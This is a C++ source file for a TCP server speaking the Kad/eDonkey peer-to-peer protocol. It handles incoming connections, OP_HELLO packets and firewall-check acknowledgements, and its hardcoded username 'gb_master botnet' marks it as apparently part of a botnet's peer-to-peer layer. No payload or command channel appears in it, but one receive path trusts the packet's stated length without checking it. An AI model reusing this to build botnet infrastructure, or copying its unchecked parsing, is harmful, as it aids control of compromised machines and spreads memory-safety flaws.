#include <vector>

#include "kad/kad.h"
#include "net/tcp.h"
#include "tcp/tcpserver.h"

TCPServer::TCPServer()
{
    _num_connections = 0;
    _tcp_port = 21701;
    _sock = tcp_listen(_tcp_port);

    for(unsigned int i = 0 ; i < 16; i++)
        _user_hash[i] = rand();

    _username = "gb_master botnet";
    _version = 0x3F;

    WriteLog("TCP INITIALIZED: TCP " << _tcp_port <<
                             " username \"" << _username << "\"");
}

bool TCPServer::send_tcp_packet(SOCKET s, const unsigned char protocol, const unsigned char opcode, const unsigned char *payload, const uint32_t length)
{
    unsigned char* buffer = new unsigned char[length + 6];

    buffer[0] = protocol;
    memcpy(buffer + 1, &length, 4);
    memcpy(buffer + 5, &opcode, 1);
    memcpy(buffer + 6, payload, length);

    if(tcp_send(s, buffer, length + 6) == SOCKET_ERROR)
    {
        delete [] buffer;
        return false;
    }

    delete [] buffer;
    return true;
}

void TCPServer::retrieve_and_dispatch_potential_packet()
{
    // Is there a new connection incoming?
    uint32_t acc_ip;
    uint16_t acc_port;
    SOCKET acc_s = tcp_accept(_sock, &acc_ip, &acc_port);
    if(acc_s != INVALID_SOCKET)
    {
        if(_num_connections < MAX_TCP_CONNECTIONS)
        {
            _num_connections++;
            WriteLog("Accepted connection from " << ip_to_str(acc_ip));
            _pending_connections.push_back(std::make_pair (acc_ip, acc_s));
        }
        else
        {
            closesocket(acc_s);
        }
    }

    // Some new data incoming?
    unsigned int i = 0;
    while(i != _pending_connections.size())
    {
        unsigned char* buffer;
        unsigned int length;

        uint32_t ip_address = _pending_connections[i].first;
        SOCKET sock = _pending_connections[i].second;

        int ret = tcp_recv(sock, &buffer, &length);
        if(ret > 0)
        {
            WriteLog("Received a TCP packet of " << length << "B from " << ip_to_str(ip_address));

            // eDonkey header ?
            if(buffer[0] != OP_EDONKEYHEADER)
            {
                WriteErrLog("Wrong protocol: " << (uint16_t)buffer[0]);
            }
            else
            {
                // Extract payload length and check it
                uint32_t payload_len = *(uint32_t *)&(buffer[1]);
                if(payload_len != length - 1 - 4)
                {
                    WriteErrLog("Wrong payload length inside the packet (" << payload_len << "B)");
                }
                else
                {
                    unsigned char* payload = buffer + 5;
                    unsigned char type = payload[0];

                    // Actually here only OP_HELLO can be received
                    if(type != OP_HELLO)
                    {
                        WriteErrLog("Received a non-expected TCP packet from " << ip_to_str(ip_address) << ". Closing connection...");

                        closesocket(sock);
                        _pending_connections.erase(_pending_connections.begin() + i);
                        _num_connections--;

                        delete [] buffer;

                        continue;
                    }
                    else
                    {
                        // It's an OP_HELLO packet, perfect. Let's update the corresponding contact
                        // in order to store the information
                        WriteLog("It's an OP_HELLO");
                        if(payload_len < 28)
                        {
                            // We need at least 28B here (empty tag list)
                            WriteErrLog("Payload too short. Discarding...");
                        }
                        else
                        {
                            uint16_t tcp_port = *(uint16_t *)&(payload[22]);

                            Contact *contact = RoutingTable::get_instance().get_contact_by_ip(ip_address, tcp_port, true);
                            if(contact != NULL)
                            {
                                // The socket is moved inside the contact class and then deleted from the pending conn vector
                                contact->set_tcp_socket(sock);
                                _pending_connections.erase(_pending_connections.begin() + i);

                                contact->process_tcp_hello_packet(payload);

                                delete [] buffer;
                                continue;
                            }
                        }
                    }
                }
            }

            delete [] buffer;
        }
        else if(ret == -1)
        {
            WriteLog("Closing TCP connection with " << ip_to_str(ip_address));

            // Error while reading the socket. Close the connection, please...
            closesocket(sock);
            _pending_connections.erase(_pending_connections.begin() + i);
            _num_connections--;

            continue;
        }

        i++;
    }

    // Loop on all the other confirmed connections
    std::list<KBucket *> kBuckets_list;
    RoutingTable::get_instance().get_all_kBuckets(kBuckets_list);
    for(std::list<KBucket *>::iterator kIt = kBuckets_list.begin();
        kIt != kBuckets_list.end();
        kIt++)
    {
        KBucket *kBucket = *kIt;

        std::list<Contact *> contact_list;
        kBucket->get_contact_list(contact_list);
        for(std::list<Contact *>::const_iterator contIt = contact_list.begin(); contIt != contact_list.end(); contIt++)
        {
            Contact *contact = *contIt;
            if(contact->get_tcp_socket() == INVALID_SOCKET)
                continue;

            SOCKET sock = contact->get_tcp_socket();
            unsigned char* buffer;
            unsigned int length;
            uint32_t ip_address = contact->get_ip_address();

            int ret = tcp_recv(sock, &buffer, &length);
            if(ret > 0)
            {
                WriteLog("Received a TCP packet of " << length << "B from " << ip_to_str(ip_address));

                if(length < 5)
                {
                    WriteErrLog("Packet too short. Discarding...");
                }
                else
                {
                    unsigned char protocol_type = buffer[0];
                    uint32_t payload_len = *(uint32_t *)(buffer + 1);
                    if(payload_len > 0)
                    {
                        if(protocol_type == OP_EMULEPROT)
                            process_emuleprot_packet(ip_address, buffer + 5, payload_len);
                        else
                            WriteErrLog("Wrong protocol: " << (uint16_t)buffer[0]);
                    }
                }

                delete [] buffer;
            }
            else if(ret == -1)
            {
                WriteLog("Closing TCP connection with " << ip_to_str(ip_address));

                // Error while reading the socket. Close the connection, please...
                close_connection(sock);
                contact->set_tcp_socket(INVALID_SOCKET);
                _num_connections--;

                continue;
            }
        }
    }
}

void TCPServer::process_emuleprot_packet(uint32_t ip_address, const unsigned char *buffer, uint32_t /*buffer_size*/)
{
    uint32_t opcode = buffer[0];

    switch(opcode)
    {
        case OP_KAD_FWTCPCHECK_ACK:
            WriteLog("It's an OP_KAD_FWTCPCHECK_ACK");
            process_kad_fwtcpcheck_ack(ip_address);
            break;
        default:
            assert(false);
    }
}

void TCPServer::process_kad_fwtcpcheck_ack(uint32_t ip_address)
{
    if(Firewall::get_instance().is_firewall_req_ip_address(ip_address))
    {
        bool before = Firewall::get_instance().is_tcp_firewalled();
        Firewall::get_instance().increase_tcp_fw_res();
        bool after = Firewall::get_instance().is_tcp_firewalled();

        // Ok, we received the packet. The IP address can be removed
        // from the list of pending fw confirmations
        Firewall::get_instance().remove_firewall_req_ip_address(ip_address);

        if(before != after && after == false)
        {
            // The TCP firewalled status changed. Notify it into the logs
            WriteLog("TCP port not firewalled anymore. Kad is fully connected!");
        }
    }
    else
    {
        WriteWarnLog("Received an unexpected OP_KAD_FWTCPCHECK_ACK. Discarding...");
    }
}
